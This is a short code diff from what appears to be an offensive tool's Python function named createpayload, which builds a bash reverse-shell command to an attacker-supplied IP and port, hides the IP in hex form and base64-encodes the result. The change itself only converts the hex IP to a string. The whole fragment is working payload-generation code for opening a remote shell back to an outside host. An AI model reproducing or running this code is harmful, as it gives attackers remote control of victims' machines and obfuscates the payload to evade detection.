@@ -46,7 +46,7 @@ def createpayload(ip, port):
 
     # Rewrite our ip in HEX (https://github.com/D4Vinci/Cuteit)
     hexip = cit.lib(ip)
-    base64payload = os.popen("printf 'bash -i >& /dev/tcp/" + hexip + "/" + port + " 0>&1' | base64 | tr -d '\n'").read()
+    base64payload = os.popen("printf 'bash -i >& /dev/tcp/" + str(hexip) + "/" + port + " 0>&1' | base64 | tr -d '\n'").read()
 
     return base64payload
 
